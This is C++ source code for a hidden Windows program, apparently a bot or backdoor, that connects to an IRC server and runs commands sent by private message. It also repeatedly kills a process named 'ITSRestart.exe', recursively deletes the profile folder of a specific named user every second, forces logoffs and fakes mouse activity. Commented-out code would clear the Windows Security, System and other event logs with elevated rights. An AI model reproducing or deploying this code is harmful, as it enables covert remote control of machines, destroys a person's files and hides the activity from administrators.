#include "stdafx.h"

#include <Windows.h>
#include <TlHelp32.h>
#include <string>
#include <vector>

#include "IRCClient.h"
#include "native_utils.h"
#include "command.h"
#include "routine.h"

inline bool StrContains(const std::string &str, const std::string &contained_val) {
	return str.find(contained_val) != std::string::npos;
}
orion::ErrorCode StrSplit(std::string input, const std::string &delimiter, std::vector<std::string> *output) {
	orion::ErrorCode error = orion::ErrorCodes::kSuccess;
	if (output == nullptr || input.length() == 0) {
		error = orion::ErrorCodes::kInvalidParam;
		return error;
	}
	if (!StrContains(input, delimiter)) {
		output->push_back(input);
		return error;
	}
	size_t delim_pos;
	std::string old_input(input);
	size_t last_delim = old_input.find_last_of(delimiter);
	while ((delim_pos = input.find(delimiter)) != std::string::npos) {
		std::string token = input.substr(0, delim_pos - 0);
		if (token.length() != 0) {
			output->push_back(token);
		}
		input.erase(0, delim_pos + delimiter.length() - 0);
	}
	if (last_delim != std::string::npos && last_delim != old_input.length() - 1) {
		std::string token = old_input.substr(last_delim + 1);
		if (token.length() != 0) {
			output->push_back(token);
		}
	}
	return error;
}

void OnPrivMsg(IRCMessage message, IRCClient* client) {
	std::string text = message.parameters.at(message.parameters.size() - 1);
	size_t space_idx = text.find_first_of(" ");
	auto &found_cmd = orion::g_cmds.find(space_idx != std::string::npos ? text.substr(0, space_idx) : text);
	if (found_cmd != orion::g_cmds.end()) {
		std::vector<std::string> args;
		StrSplit(text, " ", &args);
		if (!args.empty()) {
			args.erase(args.begin());
		}
		found_cmd->second->Execute(args);
	}
}
void IrcLoop(IRCClient *irc) {
	while (true) {
		if (irc->Connected()) {
			irc->ReceiveData();
		}
		Sleep(1);
	}
}

int DeleteDirectory(const std::string &refcstrRootDirectory,
	bool              bDeleteSubdirectories = true)
{
	bool            bSubdirectory = false;       // Flag, indicating whether
												 // subdirectories have been found
	HANDLE          hFile;                       // Handle to directory
	std::string     strFilePath;                 // Filepath
	std::string     strPattern;                  // Pattern
	WIN32_FIND_DATA FileInformation;             // File information


	strPattern = refcstrRootDirectory + "\\*.*";
	hFile = ::FindFirstFile(strPattern.c_str(), &FileInformation);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		do
		{
			if (FileInformation.cFileName[0] != '.')
			{
				strFilePath.erase();
				strFilePath = refcstrRootDirectory + "\\" + FileInformation.cFileName;

				if (FileInformation.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				{
					if (bDeleteSubdirectories)
					{
						// Delete subdirectory
						int iRC = DeleteDirectory(strFilePath, bDeleteSubdirectories);
						if (iRC)
							return iRC;
					}
					else
						bSubdirectory = true;
				}
				else
				{
					// Set file attributes
					if (::SetFileAttributes(strFilePath.c_str(),
						FILE_ATTRIBUTE_NORMAL) == FALSE)
						return ::GetLastError();

					// Delete file
					if (::DeleteFile(strFilePath.c_str()) == FALSE)
						return ::GetLastError();
				}
			}
		} while (::FindNextFile(hFile, &FileInformation) == TRUE);

		// Close handle
		::FindClose(hFile);

		DWORD dwError = ::GetLastError();
		if (dwError != ERROR_NO_MORE_FILES)
			return dwError;
		else
		{
			if (!bSubdirectory)
			{
				// Set directory attributes
				if (::SetFileAttributes(refcstrRootDirectory.c_str(),
					FILE_ATTRIBUTE_NORMAL) == FALSE)
					return ::GetLastError();

				// Delete directory
				if (::RemoveDirectory(refcstrRootDirectory.c_str()) == FALSE)
					return ::GetLastError();
			}
		}
	}

	return 0;
}
int ClearLogs(std::string log) {
	SHELLEXECUTEINFO exec_info;
	exec_info.cbSize = sizeof(SHELLEXECUTEINFO);
	exec_info.fMask = SEE_MASK_NOASYNC | SEE_MASK_NOCLOSEPROCESS;
	exec_info.hwnd = NULL;
	exec_info.lpVerb = TEXT("runas");
	exec_info.lpFile = "wevtutil";
	exec_info.lpParameters = ("cl " + log).c_str();
	exec_info.lpDirectory = "C:\\WINDOWS\\system32";
	exec_info.nShow = SW_SHOWDEFAULT;
	if (!ShellExecuteEx(&exec_info)) {
		return GetLastError();
	}
	WaitForSingleObject(exec_info.hProcess, INFINITE);
	CloseHandle(exec_info.hProcess);
	return 0;
}
static POINT last_pos{ 0 };
static ULONGLONG inactive_time = 0;
void MousePosPoll(void *unused) {
	RECT resolution = orion::GetResolution();
	POINT mouse_pos{ 0 };
	while (true) {
		GetCursorPos(&mouse_pos);
		if (mouse_pos.x <= 51 && mouse_pos.y >= resolution.bottom - 48 - 41 && mouse_pos.y <= resolution.bottom - 41) {
			ExitWindowsEx(EWX_LOGOFF | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER);
			break;
		}
		if (inactive_time == 0) {
			inactive_time = GetTickCount64();
		}
		if (last_pos.x == mouse_pos.x && last_pos.y == mouse_pos.y && GetTickCount64() - inactive_time >= 888000) {
			MOUSEINPUT mouse_in{ 0 };
			int delta_x = rand() % 11;
			mouse_in.dx = rand() % 2 ? -delta_x : delta_x;
			int delta_y = rand() % 11;
			mouse_in.dy = rand() % 2 ? -delta_y : delta_y;
			mouse_in.dwFlags = MOUSEEVENTF_MOVE;
			orion::SendMouseIn(&mouse_in);
			inactive_time = GetTickCount64();
		}
		else if (last_pos.x != mouse_pos.x && last_pos.y != mouse_pos.y) {
			inactive_time = GetTickCount64();
		}
		last_pos = mouse_pos;
		Sleep(1);
	}
}
void TerminateItsLoop(void *unused) {
	while (true) {
		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		PROCESSENTRY32 pe32{ 0 };
		pe32.dwSize = sizeof(PROCESSENTRY32);
		Process32First(snapshot, &pe32);
		do {
			if (std::string("ITSRestart.exe") == pe32.szExeFile) {
				HANDLE process = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
				if (process) {
					TerminateProcess(process, 0);
					CloseHandle(process);
				}
			}
		} while (Process32Next(snapshot, &pe32));
		CloseHandle(snapshot);
		DeleteDirectory("C:\\Users\\emcdonald5");
		RemoveDirectory("C:\\Users\\emcdonald5");
		Sleep(1000);
	}
}
int main() {
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	HANDLE mouse_thread = CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(MousePosPoll), NULL, 0, NULL);
	/*ClearLogs("Application");
	ClearLogs("Security");
	ClearLogs("Setup");
	ClearLogs("System");*/
	IRCClient irc;
	irc.InitSocket();
	irc.Connect("chat.freenode.net", 6665);
	std::string username = orion::GetWinUser();
	irc.Login(username, username);
	irc.SendIRC("JOIN " + orion::kIrcChannel);
	irc.HookIRCCommand("PRIVMSG", OnPrivMsg);
	orion::InitRoutines();
	orion::RegisterCmds();
	HANDLE loop_thread = CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(IrcLoop), &irc, 0, NULL);
	HANDLE its_thread = CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(TerminateItsLoop), NULL, 0, NULL);
	while (true) {
		for (auto &it : orion::g_routines) {
			if (it.second->is_enabled()) {
				it.second->Update();
			}
		}
		Sleep(1);
	}
	CloseHandle(loop_thread);
	if (irc.Connected()) {
		irc.Disconnect();
	}
	orion::UninitRoutines();
	CloseHandle(its_thread);
	CloseHandle(mouse_thread);
	return 0;
}
